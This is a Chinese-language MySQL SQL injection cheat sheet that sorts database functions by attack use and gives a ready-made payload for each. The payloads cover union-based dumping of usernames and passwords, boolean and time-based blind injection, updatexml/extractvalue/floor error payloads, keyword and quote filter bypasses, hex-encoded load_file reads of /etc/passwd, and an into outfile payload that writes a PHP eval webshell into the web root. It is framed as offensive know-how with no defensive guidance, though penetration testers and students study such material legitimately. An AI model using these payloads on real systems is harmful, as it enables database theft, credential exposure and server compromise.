在MySQL SQL注入场景中，函数是信息获取、数据猜解、绕过过滤、读写文件的核心工具。以下按**注入用途分类**详细列出常用函数，包含功能说明、注入场景与典型用法。

---

## 一、信息收集类函数

用于获取数据库版本、用户、库名、系统路径等基础信息，是注入的第一步探测工具。

### 1. 环境信息获取

| 函数/变量 | 功能说明 | 注入用途 | 示例 |
| --- | --- | --- | --- |
| `version()` | 返回MySQL版本号 | 判断版本，确定可用注入手法（如报错函数、系统表支持情况） | `union select 1,version(),3--` |
| `database()` / `schema()` | 返回当前连接的数据库名 | 获取当前库名，为后续脱库提供目标 | `union select 1,database(),3--` |
| `user()`   `current_user()`   `system_user()`   `session_user()` | 返回当前数据库用户名 | 判断权限等级（如是否为root），决定能否执行文件读写、提权操作 | `union select 1,user(),3--` |
| `@@datadir` | 数据库数据文件存储路径 | 获取系统路径，为文件读写、拖库提供目标 | `union select 1,@@datadir,3--` |
| `@@basedir` | MySQL安装目录 | 定位MySQL配置文件、插件目录 | `union select 1,@@basedir,3--` |
| `@@version_compile_os` | 服务器操作系统类型 | 判断是Linux/Windows，选择对应文件路径与提权方式 | `union select 1,@@version_compile_os,3--` |
| `@@secure_file_priv` | 文件读写限制目录 | 判定`load_file`/`into outfile`是否可用、可用路径范围 | `union select 1,@@secure_file_priv,3--` |

> 
> 补充：`current_user()` 返回权限校验时的用户，`user()` 返回当前连接的实际用户，两者可能存在差异。

### 2. 结果拼接函数

解决union注入显示位不足、多行结果无法一次性输出的问题。

- **`concat(str1, str2, ...)`**
  - 功能：拼接多个字符串为一个字符串
  - 注入用途：将多个字段值拼接在一个显示位输出
  - 示例：`union select 1,concat(username,0x3a,password),3 from users--`（`0x3a`是冒号的十六进制，无需引号）
- **`concat_ws(separator, str1, str2, ...)`**
  - 功能：带分隔符的字符串拼接，第一个参数为分隔符
  - 注入用途：同`concat()`，但分隔符统一，结果更易读
  - 示例：`union select 1,concat_ws('~',username,password),3 from users--`
- **`group_concat(expr separator '分隔符')`**
  - 功能：将多行查询结果拼接成一个单行字符串
  - 注入用途：批量获取所有表名、字段名、数据，是脱库的核心函数
  - 示例：`union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--`

## 二、字符串处理类函数

是**布尔盲注、时间盲注**的核心工具，也广泛用于绕过WAF的关键字、字符过滤。

### 1. 字符串截取（盲注逐位猜解核心）

- **`substr(str, pos, length)` / `substring()` / `mid()`**
  - 功能：从字符串`pos`位置开始，截取`length`长度的字符
  - 注入用途：逐位截取库名、表名、字段值，配合`ascii()`进行猜解
  - 示例：`and ascii(substr(database(),1,1))=115--`（判断库名第一个字符ASCII是否为115，即小写s）
- **`left(str, n)` / `right(str, n)`**
  - 功能：取字符串左侧/右侧n个字符
  - 注入用途：简化盲注写法，或绕过`substr`关键字过滤
  - 示例：`and ascii(left(database(),1))=115--`

### 2. 字符编码转换

- **`ascii(char)` / `ord(char)`**
  - 功能：返回单个字符的ASCII码数值
  - 注入用途：将截取的字符转为数字，通过大小比较实现盲注猜解
  - 示例：`and ascii(substr(user(),1,1))=114--`（判断用户名首字母是否为r）
- **`char(num1, num2, ...)`**
  - 功能：将ASCII码数值还原为对应字符
  - 注入用途：构造字符串绕过单引号过滤，避免关键字检测
  - 示例：`union select 1,char(117,115,101,114),3--` 等价于查询字符串`'user'`
- **`hex(str)` / `unhex(hex_str)`**
  - 功能：字符串与十六进制编码互相转换
  - 注入用途：**绕过单引号过滤**（文件路径、字符串转十六进制后无需引号）；编码数据绕过关键字检测
  - 示例：`and load_file(0x2f6574632f706173737764)--`（`/etc/passwd`的十六进制形式，无需单引号）

### 3. 长度与位置判断

- **`length(str)` / `char_length(str)`**
  - `length()`：返回字符串**字节数**（UTF8下中文占3字节）
  - `char_length()`：返回字符串**字符数**
  - 注入用途：判断库名、表名、字段值的总长度，划定盲注猜解范围
  - 示例：`and length(database())=8--`
- **`instr(str, substr)` / `locate(substr, str)` / `position(substr in str)`**
  - 功能：返回子串在目标字符串中的位置
  - 注入用途：替代`substr()+ascii()`组合进行盲注，或绕过`substr`关键字过滤
  - 示例：`and instr(database(),'test')=1--`（判断库名是否以test开头）

### 4. 绕过过滤常用

- **`reverse(str)`**
  - 功能：反转字符串
  - 注入用途：绕过关键字正则过滤（如反向拼接关键字），或反向猜解数据
  - 示例：`and reverse(substr(database(),1,4))=reverse('test')--`
- **`replace(str, from_str, to_str)`**
  - 功能：替换字符串中的指定子串
  - 注入用途：双写关键字绕过过滤（如`selselectect`替换后还原为`select`）
  - 示例：`and replace('selselectect','select','')='select'--`
- **`insert(str, pos, len, newstr)`**
  - 功能：在指定位置替换指定长度的字符串
  - 注入用途：构造变形关键字，绕过WAF检测

## 三、报错注入专用函数

利用MySQL函数执行异常时的报错信息，将查询结果嵌入报错内容返回，适用于页面显示数据库错误的场景。

### 1. XML类报错（最常用，兼容性好）

- **`updatexml(xml_doc, xpath_expr, new_value)`**
  - 原理：第二个参数`xpath_expr`格式非法时，会抛出包含表达式内容的报错
  - 注入用法：在xpath位置拼接查询语句，用`~`（0x7e）等非法字符触发报错
  - 示例：`and updatexml(1, concat(0x7e, (select database()), 0x7e), 1)--`
  - 限制：单次最多返回32个字符，长数据需配合`substr()`分段获取
- **`extractvalue(xml_doc, xpath_expr)`**
  - 原理：同`updatexml()`，xpath表达式非法时报错带出数据
  - 示例：`and extractvalue(1, concat(0x7e, (select user()), 0x7e))--`
  - 限制：同样单次最多返回32个字符

### 2. floor() 经典报错

- 原理：`floor(rand(0)*2)` 配合 `group by` 产生主键重复错误，兼容性极强（MySQL 5.x全版本支持）
- 固定句式：```
and (select 1 from (select count(*), concat(查询语句, floor(rand(0)*2))x from information_schema.tables group by x)a)--
```
- 示例：```
and (select 1 from (select count(*), concat(database(), floor(rand(0)*2))x from information_schema.tables group by x)a)--
```

### 3. 数值溢出报错

- **`exp(num)`**
  - 原理：计算自然指数，当参数大于709时发生数值溢出，触发报错
  - 示例：`and exp(~(select * from (select user())a))--`
  - 版本：MySQL 5.5.5 及以上版本支持

### 4. 几何函数报错

- **`polygon()` / `linestring()` / `multipoint()`**
  - 原理：传入非几何格式的查询结果，触发格式校验错误
  - 示例：`and polygon((select * from (select database())a))--`

### 5. 其他报错函数

- **`name_const()`**：利用列名重复触发报错，适用于老版本MySQL
- **`procedure analyse()`**：老版本MySQL可通过存储过程报错带出数据

## 四、盲注类函数（布尔/时间盲注）

用于页面无回显、无报错，只能通过页面真假或响应时间判断查询结果的场景。

### 1. 条件判断核心

- **`if(condition, true_expr, false_expr)`**
  - 功能：条件成立执行true分支，否则执行false分支
  - 注入用途：盲注的核心逻辑控制
  - 布尔盲注示例：`and if(ascii(substr(database(),1,1))=115, 1, 0)--`
  - 时间盲注示例：`and if(ascii(substr(database(),1,1))=115, sleep(5), 0)--`
- **`case when 条件 then 结果1 else 结果2 end`**
  - 功能：多分支条件判断，等价于`if()`
  - 注入用途：绕过`if`关键字过滤的替代方案
  - 示例：`and case when ascii(substr(database(),1,1))=115 then sleep(5) else 0 end--`

### 2. 延时执行函数

- **`sleep(seconds)`**
  - 功能：让数据库线程休眠指定秒数
  - 注入用途：时间盲注核心，通过页面响应时间判断条件是否成立
  - 示例：`and if(database()='test', sleep(5), 0)--`
- **`benchmark(count, expr)`**
  - 功能：重复执行表达式`count`次，造成时间延迟
  - 注入用途：绕过`sleep()`关键字过滤的替代延时方案
  - 示例：`and if(database()='test', benchmark(1000000, md5('test')), 0)--`

## 五、文件操作类函数（高危，需FILE权限）

需要当前数据库用户拥有`FILE`权限，且`@@secure_file_priv`配置允许对应目录操作。

### 1. `load_file(file_path)`

- 功能：读取服务器上指定路径的文件内容
- 注入用途：读取系统配置文件、网站源码、密码文件等敏感信息
- 注意：路径支持十六进制编码，绕过单引号过滤
- 示例：```
union select 1, load_file(0x2f6574632f706173737764), 3--
```

### 2. `into outfile` / `into dumpfile`

- 功能：将查询结果写入服务器指定文件
- 注入用途：写入WebShell、恶意配置、提权脚本等
- 区别：
  - `into outfile`：适合写入文本，会自动换行、转义特殊字符
  - `into dumpfile`：适合写入二进制文件，仅写入单行原始数据
- 示例：```
select '<?php eval($_POST[cmd]);?>' into outfile '/var/www/html/shell.php'--
```

## 六、编码加密与辅助函数

### 1. 编码加密类

用于数据编码绕过WAF、猜解加密字段等场景：

- `md5(str)`：MD5哈希加密
- `sha1(str)` / `sha2(str, length)`：SHA系列哈希
- `aes_encrypt(str, key)` / `aes_decrypt(str, key)`：AES对称加解密
- `to_base64(str)` / `from_base64(str)`：Base64编解码（MySQL 5.6+支持）

### 2. 其他辅助函数

- `rand()`：生成0-1随机数，用于floor报错注入、随机延时
- `count(*)`：统计行数，判断表数量、数据总量
- `last_insert_id()`：获取最后插入的自增ID，常用于二次注入
- `found_rows()` / `row_count()`：获取查询行数、DML语句影响行数

---

## 补充说明

1. **版本差异**：部分函数（如`exp()`报错、`to_base64()`）仅在特定MySQL版本可用，注入前需通过`version()`确认版本。
2. **权限限制**：文件读写、系统变量查询等操作受用户权限和`secure_file_priv`配置限制。
3. **过滤绕过**：实际场景中常通过大小写变形、双写、编码、内联注释等方式组合使用上述函数，绕过WAF检测。
